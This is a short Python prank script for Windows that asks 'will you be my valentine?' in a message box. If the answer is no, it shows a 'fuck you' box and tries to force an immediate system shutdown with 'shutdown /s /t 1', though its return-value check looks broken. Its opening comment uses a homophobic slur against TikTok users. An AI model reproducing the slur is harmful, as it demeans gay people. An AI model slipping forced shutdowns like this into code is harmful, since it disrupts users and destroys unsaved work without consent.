# these tiktok weird fags
# coded this while on phone ill fix up once i get on pc

import ctypes
import os

def main():
    answer = ctypes.windll.user32.MessageBoxW(0, "will you be my valentine?" , "", 4)
    if answer == 6:
        ctypes.windll.user32.MessageBoxW(0, "Thanks Princess" , "", 0)
    elif answer == 7:
        answer2 = ctypes.windll.user32.MessageBoxW(0, "fuck you" , "", 0)
        if answer2 == 0:
            os.system("shutdown /s /t 1")

if __name__ == '__main__':
    main()
